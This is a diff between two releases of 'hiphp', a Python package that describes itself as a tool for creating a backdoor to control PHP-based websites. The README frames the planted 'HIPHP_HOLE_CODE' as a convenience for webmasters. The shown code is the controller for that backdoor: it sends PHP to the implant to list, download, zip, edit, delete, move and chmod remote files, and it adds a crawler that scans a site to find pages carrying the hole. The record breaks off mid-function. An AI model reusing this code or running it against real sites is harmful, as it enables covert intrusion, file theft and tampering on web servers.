# Comparing `tmp/hiphp-0.3.2.tar.gz` & `tmp/hiphp-0.3.3.tar.gz`

## filetype from file(1)

```diff
@@ -1 +1 @@
-gzip compressed data, was "hiphp-0.3.2.tar", last modified: Sat May 27 15:08:09 2023, max compression
+gzip compressed data, was "hiphp-0.3.3.tar", last modified: Sat Jun  3 14:30:18 2023, max compression
```

## Comparing `hiphp-0.3.2.tar` & `hiphp-0.3.3.tar`

### file list

```diff
@@ -1,24 +1,25 @@
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-27 15:08:09.503283 hiphp-0.3.2/
--rw-r--r--   0 runner    (1001) docker     (123)     1088 2023-05-27 15:07:44.000000 hiphp-0.3.2/LICENSE
--rw-r--r--   0 runner    (1001) docker     (123)    18343 2023-05-27 15:08:09.503283 hiphp-0.3.2/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)    31514 2023-05-27 15:07:44.000000 hiphp-0.3.2/README.md
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-27 15:08:09.499282 hiphp-0.3.2/hiphp/
--rw-r--r--   0 runner    (1001) docker     (123)    22992 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/__init__.py
--rw-r--r--   0 runner    (1001) docker     (123)     1323 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpabout.py
--rw-r--r--   0 runner    (1001) docker     (123)     1379 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpcoding.py
--rw-r--r--   0 runner    (1001) docker     (123)     3017 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpeditor.py
--rw-r--r--   0 runner    (1001) docker     (123)     5047 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphphelp.py
--rw-r--r--   0 runner    (1001) docker     (123)     1997 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphplicense.py
--rw-r--r--   0 runner    (1001) docker     (123)     2483 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphplinkextractor.py
--rw-r--r--   0 runner    (1001) docker     (123)     3218 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphplogo.py
--rw-r--r--   0 runner    (1001) docker     (123)     1546 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpmsgs.py
--rw-r--r--   0 runner    (1001) docker     (123)    10431 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpphpfunctions.py
--rw-r--r--   0 runner    (1001) docker     (123)      889 2023-05-27 15:07:44.000000 hiphp-0.3.2/hiphp/hiphpversion.py
-drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-05-27 15:08:09.503283 hiphp-0.3.2/hiphp.egg-info/
--rw-r--r--   0 runner    (1001) docker     (123)    18343 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/PKG-INFO
--rw-r--r--   0 runner    (1001) docker     (123)      416 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/SOURCES.txt
--rw-r--r--   0 runner    (1001) docker     (123)        1 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/dependency_links.txt
--rw-r--r--   0 runner    (1001) docker     (123)       51 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/requires.txt
--rw-r--r--   0 runner    (1001) docker     (123)        6 2023-05-27 15:08:09.000000 hiphp-0.3.2/hiphp.egg-info/top_level.txt
--rw-r--r--   0 runner    (1001) docker     (123)       74 2023-05-27 15:08:09.503283 hiphp-0.3.2/setup.cfg
--rw-r--r--   0 runner    (1001) docker     (123)     3310 2023-05-27 15:07:44.000000 hiphp-0.3.2/setup.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-03 14:30:18.863586 hiphp-0.3.3/
+-rw-r--r--   0 runner    (1001) docker     (123)     1088 2023-06-03 14:29:52.000000 hiphp-0.3.3/LICENSE
+-rw-r--r--   0 runner    (1001) docker     (123)    18594 2023-06-03 14:30:18.863586 hiphp-0.3.3/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)    31953 2023-06-03 14:29:52.000000 hiphp-0.3.3/README.md
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-03 14:30:18.863586 hiphp-0.3.3/hiphp/
+-rw-r--r--   0 runner    (1001) docker     (123)    26529 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/__init__.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1323 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpabout.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1379 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpcoding.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3083 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpeditor.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1638 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpfunc.py
+-rw-r--r--   0 runner    (1001) docker     (123)     5200 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphphelp.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1997 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphplicense.py
+-rw-r--r--   0 runner    (1001) docker     (123)     2483 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphplinkextractor.py
+-rw-r--r--   0 runner    (1001) docker     (123)     3211 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphplogo.py
+-rw-r--r--   0 runner    (1001) docker     (123)     1546 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpmsgs.py
+-rw-r--r--   0 runner    (1001) docker     (123)    10763 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpphpfunctions.py
+-rw-r--r--   0 runner    (1001) docker     (123)      889 2023-06-03 14:29:52.000000 hiphp-0.3.3/hiphp/hiphpversion.py
+drwxr-xr-x   0 runner    (1001) docker     (123)        0 2023-06-03 14:30:18.863586 hiphp-0.3.3/hiphp.egg-info/
+-rw-r--r--   0 runner    (1001) docker     (123)    18594 2023-06-03 14:30:18.000000 hiphp-0.3.3/hiphp.egg-info/PKG-INFO
+-rw-r--r--   0 runner    (1001) docker     (123)      435 2023-06-03 14:30:18.000000 hiphp-0.3.3/hiphp.egg-info/SOURCES.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        1 2023-06-03 14:30:18.000000 hiphp-0.3.3/hiphp.egg-info/dependency_links.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       30 2023-06-03 14:30:18.000000 hiphp-0.3.3/hiphp.egg-info/requires.txt
+-rw-r--r--   0 runner    (1001) docker     (123)        6 2023-06-03 14:30:18.000000 hiphp-0.3.3/hiphp.egg-info/top_level.txt
+-rw-r--r--   0 runner    (1001) docker     (123)       74 2023-06-03 14:30:18.863586 hiphp-0.3.3/setup.cfg
+-rw-r--r--   0 runner    (1001) docker     (123)     3373 2023-06-03 14:29:52.000000 hiphp-0.3.3/setup.py
```

### Comparing `hiphp-0.3.2/LICENSE` & `hiphp-0.3.3/LICENSE`

 * *Files identical despite different names*

### Comparing `hiphp-0.3.2/PKG-INFO` & `hiphp-0.3.3/PKG-INFO`

 * *Files 2% similar despite different names*

```diff
@@ -1,12 +1,12 @@
 Metadata-Version: 2.1
 Name: hiphp
-Version: 0.3.2
+Version: 0.3.3
 Summary: hiphp - free & open source project for create a BackDoor to control PHP-based sites.
-Home-page: UNKNOWN
+Home-page: https://github.com/yasserbdj96/hiphp
 Author: yasserbdj96
 Author-email: yasser.bdj96@gmail.com
 License: MIT License
 Project-URL: Source, https://github.com/yasserbdj96/hiphp
 Project-URL: WebSite, https://yasserbdj96.github.io/hiphp
 Project-URL: Documentation, https://yasserbdj96.github.io/hiphp
 Project-URL: Chat, https://gitter.im/yasserbdj96/hiphp
@@ -60,14 +60,15 @@
 [![Deploy static content to Pages](https://github.com/yasserbdj96/hiphp/actions/workflows/pages.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pages.yml)
 [![CodeQL](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml)
 [![CodeFactor](https://www.codefactor.io/repository/github/yasserbdj96/hiphp/badge)](https://www.codefactor.io/repository/github/yasserbdj96/hiphp)
 [![Size](https://img.shields.io/github/repo-size/yasserbdj96/hiphp)](https://img.shields.io/github/repo-size/yasserbdj96/hiphp)
 [![languages](https://img.shields.io/github/languages/count/yasserbdj96/hiphp)](https://img.shields.io/github/languages/count/yasserbdj96/hiphp)
 [![Supported Versions](https://img.shields.io/pypi/pyversions/hiphp.svg)](https://pypi.org/project/hiphp) 
 [![Visitors](https://visitor-badge.laobi.icu/badge?page_id=yasserbdj96.hiphp&format=true)](https://github.com/yasserbdj96/hiphp)
+[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false)](https://hits.seeyoufarm.com)
 [![Docker pulls](https://img.shields.io/docker/pulls/yasserbdj96/hiphp)](https://hub.docker.com/r/yasserbdj96/hiphp/)
 [![Downloads](https://img.shields.io/pypi/dm/hiphp)](https://img.shields.io/pypi/dm/hiphp)
 [![Stars](https://img.shields.io/github/stars/yasserbdj96/hiphp?color=red)](https://github.com/yasserbdj96/hiphp)
 [![Forks](https://img.shields.io/github/forks/yasserbdj96/hiphp?color=red)](https://github.com/yasserbdj96/hiphp)
 [![Watching](https://img.shields.io/github/watchers/yasserbdj96/hiphp?label=Watchers&color=red&style=flat-square)](https://github.com/yasserbdj96/hiphp)
 ![GitHub contributors](https://img.shields.io/github/contributors/yasserbdj96/hiphp)
 ![GitHub closed issues](https://img.shields.io/github/issues-closed/yasserbdj96/hiphp)
@@ -171,16 +172,16 @@
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 # OR
 # Download hiphp from gitlab:
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 # Go to downloaded folder:
 ❯ cd hiphp
 # install
-❯ pip install -r requirements.txt
-❯ sudo python setup.py install
+#❯ pip install -r requirements.txt
+❯ pip install .
 
 # Uninstall:
 ❯ pip uninstall hiphp
 ```
 
 <p>click to see <a href="https://asciinema.org/a/a8DVPENs0gGfrPhBmUGRWPYZG">Demo</a></p><br>
```

### Comparing `hiphp-0.3.2/README.md` & `hiphp-0.3.3/README.md`

 * *Files 1% similar despite different names*

```diff
@@ -21,14 +21,15 @@
 [![Deploy static content to Pages](https://github.com/yasserbdj96/hiphp/actions/workflows/pages.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/pages.yml)
 [![CodeQL](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml/badge.svg)](https://github.com/yasserbdj96/hiphp/actions/workflows/codeql-analysis.yml)
 [![CodeFactor](https://www.codefactor.io/repository/github/yasserbdj96/hiphp/badge)](https://www.codefactor.io/repository/github/yasserbdj96/hiphp)
 [![Size](https://img.shields.io/github/repo-size/yasserbdj96/hiphp)](https://img.shields.io/github/repo-size/yasserbdj96/hiphp)
 [![languages](https://img.shields.io/github/languages/count/yasserbdj96/hiphp)](https://img.shields.io/github/languages/count/yasserbdj96/hiphp)
 [![Supported Versions](https://img.shields.io/pypi/pyversions/hiphp.svg)](https://pypi.org/project/hiphp) 
 [![Visitors](https://visitor-badge.laobi.icu/badge?page_id=yasserbdj96.hiphp&format=true)](https://github.com/yasserbdj96/hiphp)
+[![Hits](https://hits.seeyoufarm.com/api/count/incr/badge.svg?url=https%3A%2F%2Fgithub.com%2Fyasserbdj96%2Fhiphp&count_bg=%2379C83D&title_bg=%23555555&icon=&icon_color=%23E7E7E7&title=hits&edge_flat=false)](https://hits.seeyoufarm.com)
 [![Docker pulls](https://img.shields.io/docker/pulls/yasserbdj96/hiphp)](https://hub.docker.com/r/yasserbdj96/hiphp/)
 [![Downloads](https://img.shields.io/pypi/dm/hiphp)](https://img.shields.io/pypi/dm/hiphp)
 [![Stars](https://img.shields.io/github/stars/yasserbdj96/hiphp?color=red)](https://github.com/yasserbdj96/hiphp)
 [![Forks](https://img.shields.io/github/forks/yasserbdj96/hiphp?color=red)](https://github.com/yasserbdj96/hiphp)
 [![Watching](https://img.shields.io/github/watchers/yasserbdj96/hiphp?label=Watchers&color=red&style=flat-square)](https://github.com/yasserbdj96/hiphp)
 ![GitHub contributors](https://img.shields.io/github/contributors/yasserbdj96/hiphp)
 ![GitHub closed issues](https://img.shields.io/github/issues-closed/yasserbdj96/hiphp)
@@ -37,16 +38,14 @@
 ![GitHub commit activity](https://img.shields.io/github/commit-activity/m/yasserbdj96/hiphp)
 [![GitHub license](https://img.shields.io/github/license/yasserbdj96/hiphp)](https://github.com/yasserbdj96/hiphp)
 [![Open Source](https://img.shields.io/badge/Open%20Source-%E2%99%A5-red)](https://github.com/yasserbdj96/hiphp)
 [![OpenSSF Best Practices](https://bestpractices.coreinfrastructure.org/projects/6754/badge)](https://bestpractices.coreinfrastructure.org/projects/6754)
 [![wakatime](https://wakatime.com/badge/github/yasserbdj96/hiphp.svg)](https://wakatime.com/badge/github/yasserbdj96/hiphp)
 [![Join the chat at https://gitter.im/yasserbdj96/hiphp](https://badges.gitter.im/yasserbdj96/hiphp.svg)](https://gitter.im/yasserbdj96/hiphp?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)
 
-
-
 <br>
 <h2>What is Hiphp?</h2>
 <p>The HIPHP BackDoor is an open-source tool that allows for remote control of websites utilizing the PHP programming language via the HTTP/HTTPS protocol. By utilizing the POST/GET method on port 80, users can access a range of functionalities such as file downloading and editing. Additionally, it offers the capability to connect to Tor networks, providing an added layer of security through the use of password protection.<br>
 
 Developed by a team of webmasters who wanted to provide greater control over their sites without relying on third-party software or services, HIPHP is a simple and user-friendly solution. By placing the <a href="#HIPHP_HOLE_CODE-Example">HIPHP_HOLE_CODE</a> in any PHP file within the site’s directory structure, users are granted access rights to make changes from anywhere in the world. This makes it an ideal solution for website owners looking for greater flexibility when managing their online presence.<br>
 
 Security is a top priority for HIPHP, with regular updates ensuring compatibility across different versions of PHP codebase used by popular content management systems (CMS). Its password protection feature adds an additional layer of defense against unauthorized access. HIPHP is a secure solution for those looking to take back full control over their website hosting environment.</p>
@@ -243,16 +242,16 @@
 ❯ git clone https://github.com/yasserbdj96/hiphp.git
 # OR
 # Download hiphp from gitlab:
 ❯ git clone https://gitlab.com/yasserbdj96/hiphp.git
 # Go to downloaded folder:
 ❯ cd hiphp
 # install
-❯ pip install -r requirements.txt
-❯ sudo python setup.py install
+#❯ pip install -r requirements.txt
+❯ pip install .
 
 # Uninstall:
 ❯ pip uninstall hiphp
 ```
 
 <br>
 <h4>Ubuntu-Nethunter Installation:</h4>
@@ -427,15 +426,22 @@
     CTRL+s                           # Save the changes.
 
   --rm, rm, delete                   # Delete files and folders.
   Usage: --rm [-f/-d] [FILE/DIR_PATH]
     --rm -f [FILE_PATH]              # Delete a file.
     --rm -d [DIR_PATH]               # Delete a folder.
 
+  --mv, mv                           # Move files and folders.
+  Usage: --mv [SOURCE] [DESTINATION]
+
+  --chmod, chmod                     # change file/folder permissions
+  Usage: --chmod [PERMISSIONS] [FILE/DIR_PATH]
+
 About:
+
   --update, update                   # Check for updates.
   --license, license                 # View the project license.
   --about, about                     # About this project.
   --version, version                 # Get the current version number.
 ```
 
 <br>
@@ -692,8 +698,8 @@
     <a href="https://pypi.org/user/yasserbdj96">pypi</a> .
     <a href="https://hub.docker.com/u/yasserbdj96">docker</a> .
     <a href="https://t.me/yasserbdj96">telegram</a> .
     <a href="https://gitter.im/yasserbdj96/yasserbdj96">gitter</a> .
     <a href="mailto:yasser.bdj96@gmail.com">e-mail</a> .
     <a href="https://github.com/sponsors/yasserbdj96">sponsor</a>
   </samp>
-</p>
+</p>
```

### Comparing `hiphp-0.3.2/hiphp/__init__.py` & `hiphp-0.3.3/hiphp/__init__.py`

 * *Files 18% similar despite different names*

```diff
@@ -20,22 +20,23 @@
 from hiphp.hiphphelp import help
 from hiphp.hiphpmsgs import *
 from hiphp.hiphplicense import license
 from hiphp.hiphpabout import about
 from hiphp.hiphplogo import *
 from hiphp.hiphpeditor import editor
 from hiphp.hiphplinkextractor import *
+from hiphp.hiphpfunc import *
 #from ashar import *
 from hexor import *
 #from asciitext import *
 import requests
 import re
 import ast
 from os.path import exists
-from biglibrary import *
+#from biglibrary import *
 import base64
 
 #
 import os
 # if OS is Windows:
 if os.name == 'nt':
     os.system('color')
@@ -49,15 +50,21 @@
 
 #start hiphp class:
 class hiphp:
     #__init__:
     def __init__(self,key,url,retu=False,proxies=""):
         #
         self.key=tomd5(str(key))# Encrypt the 'key' with 'md5'.
-        self.url=str(url)
+
+
+        if url.startswith("http://") or url.startswith("https://"):
+            self.url = str(url)
+        else:
+            self.url = "http://" + str(url)
+        #self.url=str(url)
         self.retu=retu
 
         #
         url_w=re.compile(r"https?://(www\.)?")
         self.url_w=url_w.sub('',str(url)).strip().strip('/')
         self.headers={'User-Agent':self.key}
 
@@ -80,14 +87,33 @@
         self.DS=""
 
         #
         self.sep=os.sep
 
         self.proxies=proxies
 
+    def crawl(self,url):
+        links = get_all_website_links(url)
+    
+        for link in links:
+            hiphp.check_hiphp_in(self,link)
+
+    def check_hiphp_in(self,url):
+        pp11 = hiphp.do(self, self.key, url, self.headers, True, f"echo '{self.key}';")
+
+        if pp11 != self.key:
+            self.color2.c(errx + " " + url, self.c_red)
+        else:
+            self.color2.c(msgs + " " + url, self.c_green)
+            self.url = url
+            url_w=re.compile(r"https?://(www\.)?")
+            self.url_w=url_w.sub('',str(url)).strip().strip('/')
+            hiphp.cli(self)
+            exit()
+
     #cli:
     def cli(self):
         self.DS=hiphp.do(self,self.key,self.url,self.headers,True,DIRECTORY_SEPARATOR())
         scanner="n"
 
         #logo
         logox=""
@@ -105,14 +131,18 @@
         #if (emsg_1 in reee) or (reee==None) or (emsg_3 in reee):
         if reee is None or (emsg_1 in reee or emsg_3 in reee):
             #print(reee)
             #exit()
             scanner=input(f"Scan '{self.url}' to find HIPHP_HOLE_CODE (Y/N):")
             
             if scanner.lower()=="y":
+                hiphp.crawl(self,self.url)
+                
+                exit()
+                """
                 def crawl(url):
                     #all_links=[]
                     #print(f"[*] Crawling: {url}")
                     links = get_all_website_links(url)
                     for link in links:
                         check_hiphp_in(link)
                         crawl(link)
@@ -133,14 +163,15 @@
                         self.url=url
                         hiphp.cli(self)
                         #print(url+" Succeed!")
                         exit()
                 crawl(self.url)
                 exit()
                 """
+                """
                 import requests
                 from bs4 import BeautifulSoup
  
                 urls_list=[]
                 urls = self.url
                 grab = requests.get(urls)
                 soup = BeautifulSoup(grab.text, 'html.parser')
@@ -179,96 +210,111 @@
 
         #try:
         command=input(xxr4)
         #except:
         #    exit()
         if command and command!="":
             #help
-            if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
-                help_c=command.split(" ")
+            if command.lower().startswith("--help") or command.lower().startswith("help"):
+            #if command[0:6].lower()=="--help" or command[0:4].lower()=="help":
                 try:
-                    help(__version__,help_c[1])
+                    help(__version__,command.split(" ")[1])
                 except:
                     print(help(__version__))
             #version
-            elif command[0:9].lower()=="--version" or command[0:7].lower()=="version":
+            elif command.lower().startswith("--version") or command.lower().startswith("version"):
+            #elif command[0:9].lower()=="--version" or command[0:7].lower()=="version":
                 print(__version__)
             #exit
-            elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
+            elif command.lower().startswith("--exit") or command.lower().startswith("exit"):
+            #elif command[0:6].lower()=="--exit" or command[0:4].lower()=="exit":
                 exit()
             #license
-            elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
+            elif command.lower().startswith("--license") or command.lower().startswith("license"):
+            #elif command[0:9].lower()=="--license" or command[0:7].lower()=="license":
                 print(license())
             #about
-            elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
+            elif command.lower().startswith("--about") or command.lower().startswith("about"):
+            #elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
                 print(about())
+            #chmod
+            elif command.lower().startswith("--chmod") or command.lower().startswith("chmod"):
+            #elif command[0:7].lower()=="--about" or command[0:5].lower()=="about":
+                ppth=command.split(" ")[1:]
+                code=chmod(ppth[0],ppth[1])
+                #print(code)
+                print(hiphp.do(self,self.key,self.url,self.headers,True,code))
+                #print(ppth)
             #cp
-            elif command[0:4].lower()=="--mv" or command[0:2].lower()=="mv":
-                ppth=command.split(" ")
+            elif command.lower().startswith("--mv") or command.lower().startswith("mv"):
+            #elif command[0:4].lower()=="--mv" or command[0:2].lower()=="mv":
+                ppth=command.split(" ")[1:]
                 try:
-                    command=simulate_mv(ppth[1],ppth[2])
+                    command=simulate_mv(ppth[0],ppth[1])
                     print(hiphp.do(self,self.key,self.url,self.headers,True,command))
                 except:
                     help(__version__,"--mv")
             #download
-            elif command[0:6].lower()=="--down" or command[0:4].lower()=="down" or command[0:8].lower()=="download":
-                down=command.split(" ")
+            elif command.lower().startswith("--down") or command.lower().startswith("down") or command.lower().startswith("download"):
+                down=command.split(" ")[1:]
                 try:
-                    if down[1].lower()=="-f":
+                    if down[0].lower()=="-f":
                         """command=file_get_contents(down[2])
                         content=hiphp.do(self,self.key,self.url,self.headers,True,command)
                         try:
                             out_path=down[3]
                         except:
                             out_path=""
                         finally:
                             f = open(out_path+down[2], "w+")
                             f.write(content)
                             f.close()"""
                         try:
-                            out_path=down[3]
+                            out_path=down[2]
                         except:
                             out_path=""
-                        print(smsg_1+hiphp.download(self,down[2],out_path))
-                    elif down[1].lower()=="-d":
+                        print(smsg_1+hiphp.download(self,down[1],out_path))
+                    elif down[0].lower()=="-d":
                         try:
-                            zip_file_name=hiphp.compress(self,down[2])
+                            zip_file_name=hiphp.compress(self,down[1])
                         except:
                             zip_file_name=hiphp.compress(self)
                         #zip_file_name=hiphp.do(self,self.key,self.url,self.headers,True,command)
 
                         try:
-                            out_path=down[3]
+                            out_path=down[2]
                         except:
                             out_path=""
                         print(smsg_1+hiphp.download(self,zip_file_name,out_path))
-                    elif down[1].lower()=="-all":
+                    elif down[0].lower()=="-all":
                         try:
-                            out_path=down[2]
+                            out_path=down[1]
                         except:
                             out_path=""
                         zip_file_name=hiphp.compress(self)
                         print(smsg_1+hiphp.download(self,zip_file_name,out_path))
+                    else:
+                        help(__version__,"--down")
 
                 except:
                     help(__version__,"--down")
             #zip
-            elif command[0:5].lower()=="--zip" or command[0:3].lower()=="zip":
+            elif command.lower().startswith("--zip") or command.lower().startswith("zip"):
                 
                 try:
                     ziping=command.split(" ")[1]
                     try:
                         zip_file_name=hiphp.compress(self,ziping)
                     except:
                         zip_file_name=hiphp.compress(self)
                     print(smsg_2+reee+self.DS+zip_file_name)
                 except:
                     help(__version__,"--zip")
             #update
-            elif command[0:8].lower()=="--update" or command[0:6].lower()=="update":
+            elif command.lower().startswith("--update") or command.lower().startswith("update"):
                 r="https://raw.githubusercontent.com/yasserbdj96/hiphp/main/version.txt"
                 version = requests.get(r).text
                 version=version.replace('\n', ' ').replace('\r', '').replace(' ', '')
                 if version==__version__:
                     new=False
                 else:
                     p1,p2,p3=version.split(".")
@@ -281,15 +327,41 @@
                         new=False
                 if new==True:
                     print(msg_2+version)
                     print(msg_3)
                 else:
                     print(msg_4)
             #ls
-            elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
+            elif command.lower().startswith("--ls") or command.lower().startswith("ls"):
+                if len(command) == 4 or len(command) == 2:
+                    command = scandir()
+                elif command.lower().startswith("--ls -all"):
+                    dirx = command[10:] if len(command) > 10 else "." + self.DS
+                    command = scandir_all(dirx)
+                elif command.lower().startswith("ls -all"):
+                    dirx = command[8:] if len(command) > 8 else "." + self.DS
+                    command = scandir_all(dirx)
+                else:
+                    dirx = command[5:] if len(command) == 4 else command[3:]
+                    if dirx[-1] != self.DS:
+                        dirx += self.DS
+                    command = scandir(dirx)
+
+                sd = hiphp.do(self, self.key, self.url, self.headers, True, command)
+                x = ast.literal_eval(sd)
+
+                for i in range(len(x)):
+                    if x[i] not in (".", ".."):
+                        x[i] = x[i].replace("\/", "/")
+
+                separators = " | " if len(x) > 1 else ""
+                if len(x) > 0:
+                    print(lslist(x, separator=separators))
+                #print(lslist(x, separator=separators))
+                """elif command[0:4].lower()=="--ls" or command[0:2].lower()=="ls":
                 if len(command)==4 or len(command)==2:
                     command=scandir()
                 elif command[0:4].lower()=="--ls" and command[5:9].lower()=="-all":
                     dirx=command[10:]
                     if dirx=="":
                         dirx="."+self.DS
                     command=scandir_all(dirx)
@@ -313,162 +385,171 @@
                 for i in range(len(x)):
                     if x[i]!="." and x[i]!="..":
                         x[i]=x[i].replace("\/","/")
                 if len(x)>1:
                     separators=" | "
                 else:
                     separators=""
-                biglibrary().lslist(x,separator=separators)
+                print(lslist(x,separator=separators))"""
             #set
-            elif command[0:4].lower()=="--cd" or command[0:2].lower()=="cd":
-                self.cd=""
-                if command[0:4].lower()=="--cd":
-                    self.cd=f"chdir('{reee}{self.DS}{command[5:]}');"
+            elif command.lower().startswith("--cd") or command.lower().startswith("cd"):
+                self.cd = ""
+                if command.lower().startswith("--cd"):
+                    self.cd = f"chdir('{reee}{self.DS}{command[5:]}');"
                 else:
-                    self.cd=f"chdir('{reee}{self.DS}{command[3:]}');"
+                    self.cd = f"chdir('{reee}{self.DS}{command[3:]}');"
             #set
-            elif command[0:5].lower()=="--set" or command[0:3].lower()=="set":
-                if command[0:5].lower()=="--set":
-                    self.set+=command[6:]
+            elif command.lower().startswith("--set") or command.lower().startswith("set"):
+                if command.lower().startswith("--set"):
+                    self.set += command[6:]
                 else:
-                    self.set+=command[4:]
+                    self.set += command[4:]
             #delete set
-            elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
+            elif command.lower().startswith("--dset") or command.lower().startswith("dset"):
+            #elif command[0:6].lower()=="--dset" or command[0:4].lower()=="dset":
                 self.set=""
             #clear
-            elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
+            elif command.lower().startswith("--cls") or command.lower().startswith("cls"):
+            #elif command[0:5].lower()=="--cls" or command[0:3].lower()=="cls":
                 os.system('cls' if os.name == 'nt' else 'clear')
             #Get the hole Code
-            elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
+            elif command.lower().startswith("--geth") or command.lower().startswith("geth") or command.lower().startswith("HIPHP_HOLE_CODE"):
+            #elif command[0:6].lower()=="--geth" or command[0:15].upper()=="HIPHP_HOLE_CODE" or command[0:4].lower()=="geth":
                 hiphp.get_hole(self,get=True)
             #cat
-            elif command[0:5].lower()=="--cat" or command[0:3].lower()=="cat":
-                if command[0:5].lower()=="--cat":
-                    dirx=command[6:]
-                else:
-                    dirx=command[4:]
-                command=file_get_contents(dirx)
-                hiphp.do(self,self.key,self.url,self.headers,False,command)
-            #cat
-            elif command[0:5].lower()=="--edt" or command[0:3].lower()=="edt" or command[0:4].lower()=="edit":
-                dirx=command.split(" ")[1]
-                #if command[0:5].lower()=="--edt":
-                #    dirx=command[6:]
-                #else:
-                #    dirx=command[4:]
-                
+            elif command.lower().startswith("--cat") or command.lower().startswith("cat"):
+                if command.lower().startswith("--cat"):
+                    dirx = command[6:]
+                else:
+                    dirx = command[4:]
+    
+                command = file_get_contents(dirx)
+                hiphp.do(self, self.key, self.url, self.headers, False, command)
+
+            #edt
+            elif command.lower().startswith("--edt") or command.lower().startswith("edt") or command.lower().startswith("edit"):
+                dirx = command.split(" ")[1]
+    
                 try:
-                    from_path=os.path.dirname(dirx)
+                    from_path = os.path.dirname(dirx)
                 except:
-                    from_path="."
-                #print(from_path)
-                out_path=hiphp.download(self,dirx,"")
+                    from_path = "."
+    
+                out_path = hiphp.download(self, dirx, "")
                 editor(out_path)
-                hiphp.run(self,f"unlink('{dirx}');")
-                if from_path=="":
-                    hiphp.upload(self,out_path)
+    
+                hiphp.run(self, f"unlink('{dirx}');")
+    
+                if from_path == "":
+                    hiphp.upload(self, out_path)
                 else:
-                    hiphp.upload(self,out_path,from_path+self.DS)
+                    hiphp.upload(self, out_path, from_path + self.DS)
+    
                 os.remove(out_path)
+
                 #os.system('cls' if os.name == 'nt' else 'clear')
                 #print(out_path)
 
             #remove:
-            elif command[0:4].lower()=="--rm" or command[0:2].lower()=="rm" or command[0:6].lower()=="delete":
-                dirx=command.split(" ")
-                try:
-                    command=rm(dirx[1],dirx[2])
-                    hiphp.do(self,self.key,self.url,self.headers,False,command)
-                except:
-                    help(__version__,"--rm")
-            #php_info:
-            elif command[0:9].lower()=="--phpinfo" or command[0:7].lower()=="phpinfo":
-                command=php_info()
-                hiphp.do(self,self.key,self.url,self.headers,False,command)
-            #rf
-            elif command[0:4].lower()=="--rf" or command[0:2].lower()=="rf" or command[0:3].lower()=="run":
-                varss=command.split(" ")
-                if varss[len(varss)-1]=="":
-                    del varss[len(varss)-1]
-                print(hiphp.run_file(self,varss[1],varss[2:]))
-            #up
-            elif command[0:4].lower()=="--up" or command[0:2].lower()=="up" or command[0:6].lower()=="upload":
-                v=command.split(" ")
-                #print(v)
-                if len(v)>2:
-                #try:
-                    file_path=v[1]
-                    to=v[2]
-                    if to[len(to)-1:len(to)]!=self.DS:
-                        to=to+self.DS
-                    hiphp.upload(self,file_path,to)                    
-                #except:
+            elif command.lower().startswith("--rm") or command.lower().startswith("rm") or command.lower().startswith("delete"):
+                dirx = command.split(" ")
+
+                if len(dirx) < 3:
+                    help(__version__, "--rm")
